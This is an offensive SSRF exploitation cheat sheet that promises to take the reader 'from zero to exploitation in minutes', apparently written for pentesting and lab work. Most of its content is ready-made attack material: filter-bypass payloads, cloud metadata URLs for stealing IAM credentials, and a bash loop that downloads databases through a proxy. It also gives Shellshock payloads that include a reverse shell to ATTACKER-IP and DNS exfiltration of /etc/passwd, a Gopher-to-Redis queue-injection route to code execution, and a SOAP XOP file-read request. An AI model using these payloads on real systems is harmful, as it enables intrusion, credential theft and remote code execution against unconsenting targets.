# SSRF Quick-Start Guide

Lightning-fast reference for exploiting Server-Side Request Forgery vulnerabilities. Get from zero to exploitation in minutes.


## Table of Contents

1. [Fast Exploitation Checklist](#fast-exploitation-checklist)
2. [Quick Payloads](#quick-payloads)
3. [Common Patterns](#common-patterns)
4. [Instant Recognition](#instant-recognition)
5. [Emergency Bypass Cheat Sheet](#emergency-bypass-cheat-sheet)
6. [Quick Reference Card](#quick-reference-card)

---

## Fast Exploitation Checklist

### Step 1: Identify SSRF (30 seconds)

Look for parameters:
```
url=
uri=
path=
dest=
redirect=
fetch=
page=
callback=
webhook=
stockApi=
```

**Also check for file/image proxy endpoints in HTML source:**
```
/api/s3/{filename}        # S3 proxy — server fetches from backend storage
/api/images/{filename}    # Image proxy
/api/files/{filename}     # File proxy
/proxy?url=               # Generic proxy
/fetch?file=              # File fetch endpoint
```
These are SSRF vectors — the server makes a request to a backend service (often S3/object storage) on behalf of the client. Test path traversal to escape the intended directory/bucket.

### Step 2: Test Localhost (30 seconds)

```
http://localhost/
http://127.0.0.1/
http://127.1/
http://[::1]/
```

### Step 3: Find Admin (1 minute)

Common paths:
```
/admin
/administrator
/manage
/management
/admin/delete?username=victim
```

### Step 4: Exploit (1 minute)

If blocked, try bypasses (see Quick Payloads below)

---

## File/Image Proxy SSRF (Path Traversal to Backend Services)

When the app proxies file requests to a backend (S3, object storage, internal file server), the server-side fetch URL typically looks like `http://backend:PORT/bucket/{user-input}`. Use encoded path traversal to escape the intended directory.

### Identifying Proxy Endpoints

Look in the HTML source for image/file URLs that go through the app:
```html
<img src="/api/s3/photo.jpg">          <!-- Proxied via /api/s3/ -->
<img src="/files/download/report.pdf">  <!-- Proxied via /files/download/ -->
```

Verify it's a server-side proxy (not a redirect):
```bash
curl -v http://target/api/s3/photo.jpg
# If response contains the actual file content (not a redirect), it's a server-side fetch
```

### Path Traversal Through Proxy

Use URL-encoded slashes (`%2F`) to traverse out of the intended bucket/directory:
```bash
# Escape the current bucket and access another bucket
curl http://target/api/s3/..%2Fother-bucket%2Fsecret-file.txt

# List the root (if S3 supports it)
curl http://target/api/s3/..%2F

# Access parent directories
curl http://target/api/s3/..%2F..%2Fetc%2Fpasswd
```

**Why `%2F` works**: The proxy extracts the filename by splitting the URL on `/`. URL-encoded `%2F` is NOT treated as a path separator by the proxy code, but the backend service decodes it and resolves the `..` traversal.

### Discovering Hidden Buckets/Directories

Fuzz common bucket names through the proxy traversal:
```bash
TARGET="http://target"
PROXY="/api/s3"  # or /api/images, /api/files, etc.

# Fuzz bucket names with a known file pattern
for bucket in backups backup data database db dump private internal secrets admin config; do
  for file in database.db backup.db data.db app.db users.db dump.sql; do
    RESP=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "$TARGET$PROXY/..%2F${bucket}%2F${file}")
    CODE=$(echo $RESP | cut -d: -f1)
    SIZE=$(echo $RESP | cut -d: -f2)
    if [ "$CODE" = "200" ] && [ "$SIZE" -gt 100 ]; then
      echo "[+] FOUND: $bucket/$file ($SIZE bytes)"
      curl -s "$TARGET$PROXY/..%2F${bucket}%2F${file}" -o "${bucket}_${file}"
    fi
  done
done
```

**App-specific filenames**: If the app is named "MyApp", also try `myapp.db`, `myapp.sql`, `myapp_backup.db`.

### Extracting Data from Downloaded Databases

```bash
# SQLite
sqlite3 downloaded.db ".tables"
sqlite3 downloaded.db "SELECT * FROM users;"

# Decode base64 passwords
echo "BASE64_VALUE" | base64 -d

# Check for admin/master/superuser flags in user tables
sqlite3 downloaded.db "SELECT * FROM users WHERE is_admin=1 OR isMaster=1 OR role='admin';"
```

---

## Quick Payloads

### Localhost Representations

```bash
# Standard
http://127.0.0.1/
http://localhost/

# Shorthand (bypasses blacklist)
http://127.1/
http://127.0.1/

# Decimal
http://2130706433/

# Hex
http://0x7f000001/

# Octal
http://017700000001/

# IPv6
http://[::1]/

# Zero
http://0/

# 0.0.0.0 (routes to localhost on Linux)
http://0.0.0.0/
http://0.0.0.0:6379/
```

**Use case**: When `localhost` or `127.0.0.1` is blacklisted

### DNS-Based IP Validation Bypass (0.0.0.0 Technique)

When the server validates by checking the **hostname string** (not the resolved IP), use a domain whose A record points to `0.0.0.0`:

```bash
# PHP filter_var pattern: parse_url extracts hostname → filter_var checks STRING
# If hostname is a domain name (not an IP literal), IP blocklist is skipped entirely
# 0.0.0.0 routes to localhost on Linux

# Step 1: Set up DNS A record pointing to 0.0.0.0
# Use your own domain: ssrf.yourdomain.com → A → 0.0.0.0
# Or use wildcard DNS services if they resolve inside the target

# Step 2: Use the domain in SSRF payload
http://ssrf.yourdomain.com:6379/           # Reaches localhost:6379 (Redis)
http://ssrf.yourdomain.com/admin           # Reaches localhost:80 (admin panel)
gopher://ssrf.yourdomain.com:6379/_KEYS%20*  # Gopher to Redis via domain
```

**Why it works**: Many validators (PHP `filter_var($ip, FILTER_VALIDATE_IP)`, Python `ipaddress.ip_address()`) only check IP-format strings. When `parse_url()` extracts a domain name (not an IP), the IP validation function receives a non-IP string, returns false/"invalid", and the check is skipped or passes. The actual DNS resolution to `0.0.0.0` happens later in `curl`/`file_get_contents`, reaching localhost.

**When wildcard DNS fails** (nip.io, sslip.io, localtest.me don't resolve inside target's network): register your own domain with a static A record → `0.0.0.0`. This is more reliable than wildcard DNS services which may have DNS propagation issues or be blocked.

**Key insight**: `0.0.0.0` is NOT in `127.0.0.0/8` — it's the "unspecified address" (`0.0.0.0/8`) and may not be in IP blocklists that only block `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`.

---

### Path Encoding

```bash
# Single encoding
http://127.0.0.1/%61dmin

# Double encoding (bypasses filters)
http://127.0.0.1/%2561dmin

# Full double
http://127.0.0.1/%2561d%256din/%2564%2565%256c%2565%2574%2565
```

**Use case**: When `/admin` is blacklisted

---

### Whitelist Bypasses

```bash
# Credentials format
http://localhost@trusted.com

# Fragment with double encoding
http://localhost:80%2523@trusted.com/

# Subdomain confusion
http://trusted.com.attacker.com/

# Open redirect chain
http://trusted.com/redirect?url=http://localhost/
```

**Use case**: When only trusted domains are allowed

---

### Cloud Metadata

```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
Header: Metadata-Flavor: Google
```

**Use case**: AWS/Azure/GCP credential theft

---

### Blind SSRF Detection

```bash
# Burp Collaborator
http://abc123.burpcollaborator.net

# DNS exfiltration
http://$(whoami).abc123.burpcollaborator.net

# Subdomain encoding
http://ssrf-test.abc123.burpcollaborator.net
```

**Use case**: When no response is visible

---

### Shellshock Payloads

```bash
# Basic whoami
() { :; }; /usr/bin/nslookup $(whoami).COLLABORATOR

# Read file
() { :; }; /usr/bin/nslookup $(cat /etc/passwd | base64 | cut -c1-50).COLLABORATOR

# Current directory
() { :; }; /usr/bin/nslookup $(pwd | tr '/' '-').COLLABORATOR

# Reverse shell
() { :; }; /bin/bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
```

**Use case**: RCE on internal systems via User-Agent

---

### Protocol Smuggling

```bash
# Gopher (Redis)
gopher://127.0.0.1:6379/_KEYS%20*

# File read
file:///etc/passwd

# Dict (memcached)
dict://127.0.0.1:11211/stats

# LDAP
ldap://127.0.0.1:389/dc=example,dc=com
```

**Use case**: Interact with internal services

### Gopher → Redis → Framework Queue Job Injection (RCE Chain)

When Redis is accessible via SSRF and the application uses a framework with Redis-backed queues (Laravel, Rails Sidekiq, Celery, etc.), inject a serialized job that executes commands:

```bash
# Step 1: Identify the framework from source code or response headers
# Laravel: X-Powered-By: PHP, laravel_session cookie
# Rails: X-Powered-By: Phusion Passenger, _session_id cookie

# Step 2: Build RESP (Redis Serialization Protocol) commands
# Format: *<num_args>\r\n$<arg_len>\r\n<arg>\r\n...
# Push a serialized job onto the framework's queue key

# Laravel example — RPUSH a job with command injection in a field:
# The job class must exist in the app (e.g., rmFile, CallQueuedClosure)
# Inject shell commands into string fields processed by system()/exec()

# Step 3: URL-encode the RESP payload for gopher://
gopher://target:6379/_%2A3%0D%0A%244%0D%0ARPUSH%0D%0A...

# Step 4: Retrieve output from a writable web directory
# Write output to /var/www/html/public/output.txt, then fetch it
```

**Key patterns for queue job injection:**
- **Laravel**: Queue key `queues:default`, jobs are JSON with `job` class and `data` fields. Fields passed to `system()` or `exec()` are injection points. Single-quote breakout: `'; cmd; echo '`
- **Rails/Sidekiq**: Queue key `queue:default`, jobs are JSON. Look for `perform` methods that shell out
- **Command injection in quoted contexts**: If the app wraps user data in quotes for shell commands (`system("echo '".$input."'>>file")`), break out with `'; malicious_cmd; echo '`

**Why this works**: Redis has no authentication by default. Framework queue workers blindly deserialize and execute jobs from Redis. SSRF via gopher:// sends raw TCP (RESP protocol) to Redis, allowing arbitrary queue manipulation.

---

## Common Patterns

### Pattern 1: Stock Check Features

**Vulnerable**:
```http
POST /product/stock HTTP/1.1

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

**Exploit**:
```http
stockApi=http://localhost/admin
```

---

### Pattern 2: Image/Avatar Upload

**Vulnerable**:
```http
POST /user/avatar HTTP/1.1

avatar_url=https://example.com/image.jpg
```

**Exploit**:
```http
avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

### Pattern 3: Webhook Configuration

**Vulnerable**:
```http
POST /api/webhooks HTTP/1.1

{
  "url": "https://webhook.site/abc123"
}
```

**Exploit**:
```json
{
  "url": "http://localhost:8080/admin"
}
```

---

### Pattern 4: PDF/Document Generation

**Vulnerable**:
```http
POST /generate-pdf HTTP/1.1

{
  "html": "<img src='https://example.com/logo.png'>"
}
```

**Exploit**:
```json
{
  "html": "<img src='http://169.254.169.254/latest/meta-data/'>"
}
```

---

### Pattern 5: OAuth/OpenID Callbacks

**Vulnerable**:
```http
POST /oauth/register HTTP/1.1

{
  "redirect_uri": "https://client.com/callback",
  "logo_uri": "https://client.com/logo.png"
}
```

**Exploit**:
```json
{
  "redirect_uri": "https://client.com/callback",
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

---

### Pattern 6: Analytics/Referer Processing

**Vulnerable**:
```http
GET /product?id=1 HTTP/1.1
Referer: https://google.com
```

**Exploit**:
```http
Referer: http://abc123.burpcollaborator.net
```

---

## Instant Recognition

### Is This SSRF?

**YES** if you see:
- Parameter accepts URL/URI
- Application fetches remote content
- Webhooks, callbacks, redirects
- Image/document processors
- Stock check, API integration features
- OAuth/OpenID configuration

**Test with**: `http://localhost/` or Burp Collaborator

### Response Indicators

**Exploitable**:
- Different response for localhost vs external
- Internal service responses visible
- Timeout differences between IPs
- DNS/HTTP callbacks received

**Not Exploitable**:
- Identical responses for all inputs
- Strong validation error messages
- No callbacks in blind testing

---

## Emergency Bypass Cheat Sheet

**When blocked**: Try these in order

1. **Alternative IPs**:
   ```
   127.1
   127.0.1
   2130706433
   0x7f000001
   [::1]
   0.0.0.0
   ```

2. **DNS-based bypass** (when ALL IP literals are blocked):
   ```
   http://your-domain-pointing-to-0.0.0.0/    # A record → 0.0.0.0
   ```
   Set up a domain with A record → 0.0.0.0. Bypasses validators that check hostname strings but not DNS resolution.

3. **Encoding**:
   ```
   %61dmin (single)
   %2561dmin (double)
   %C0%AE%C0%AE (UTF-8)
   ```

4. **Parsing tricks**:
   ```
   http://localhost:80%2523@trusted.com
   http://trusted.com@localhost
   http://localhost#@trusted.com
   ```

5. **Protocol switch**:
   ```
   gopher://
   file://
   dict://
   ```

6. **DNS rebinding**:
   ```
   http://rebinder.net (set up rebinding)
   http://rbndr.us (public service)
   ```

---

## Quick Reference Card

**Print this section for instant access during tests**

```
LOCALHOST BYPASS:
http://127.1/
http://2130706433/
http://[::1]/

PATH BYPASS:
/%2561dmin (double encode)
/%61dmin (single encode)

WHITELIST BYPASS:
http://localhost:80%2523@trusted.com/

AWS METADATA:
http://169.254.169.254/latest/meta-data/iam/security-credentials/

BLIND DETECTION:
Referer: http://abc123.burpcollaborator.net

SHELLSHOCK:
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).COLLABORATOR
Referer: http://192.168.0.§1§:8080

INTRUDER CONFIG:
- Payload: Numbers, 1-255
- Disable: Update Host header
- Sort by: Status code

OPENID SSRF:
POST /reg
{"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"}
```

---

---

## Nginx default_server Vhost Information Leak

When Nginx has multiple vhosts, sending an empty or unknown Host header routes to the `default_server` block, which may serve a different (internal) site:

```bash
# Send empty Host header to discover hidden vhosts
curl -H "Host: " http://target/
curl -H "Host: invalid.local" http://target/

# If the default vhost differs from the expected site, it may leak:
# - Internal admin panels
# - Different application instances
# - Debug/staging environments
# - API endpoints not exposed on the public vhost
```

**Chain with SSRF**: If an SSRF endpoint follows redirects, make it request the target with an empty Host header to reach the default vhost's internal resources.

---

## Next.js Server Actions SSRF (CVE-2024-34351 pattern)

Next.js Server Actions that return `redirect()` responses can be exploited when the app uses the Host header to construct redirect URLs:

```
1. Set Host header to attacker-controlled server
2. Trigger a Server Action that returns redirect()
3. Next.js follows the redirect using the attacker's Host
4. Attacker server responds with redirect to internal service (http://127.0.0.1:PORT/...)
5. Next.js follows the second redirect, fetching internal content
6. Response body returned to attacker
```

**Detection**: Check if changing the Host header in Server Action requests causes the response to reference the attacker hostname.

---

## Pattern: SOAP/MTOM XOP Include SSRF

When the target exposes a SOAP/WSDL endpoint (Java stacks: Apache CXF, Axis2, Metro), the XOP binary optimization mechanism can be abused for SSRF — even when XXE/DTD processing is disabled.

**Detection:**
- `?wsdl` endpoint accessible (e.g., `/ws/service?wsdl`)
- Server headers: Jetty, CXF, Axis2, GlassFish
- Responses contain `multipart/related` or `application/xop+xml`

**Exploit:** Send a MTOM multipart request with `xop:Include href` pointing to the target resource:
```bash
curl -X POST "http://target/ws/endpoint" \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<root>"; boundary="----=_Part"' \
  -d '------=_Part
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-ID: <root>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><ns:op xmlns:ns="http://target/ns">
<arg><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
  href="file:///etc/passwd"/></arg>
</ns:op></soap:Body></soap:Envelope>
------=_Part--'
```

**Supported protocols:** `http://`, `https://`, `file://`
**Response:** Fetched content appears base64-encoded in the SOAP response field
**Bypasses:** DTD blocking does NOT affect XOP processing — separate code path
**Chain:** SSRF file read (`.env`, `/proc/self/environ`, config) -> leaked credentials -> session forgery -> admin access
**Reference:** CVE-2022-46364 (Apache CXF < 3.5.5)

---

**Reference:** [SSRF Web Security Academy](https://portswigger.net/web-security/ssrf) for additional techniques and explanations.
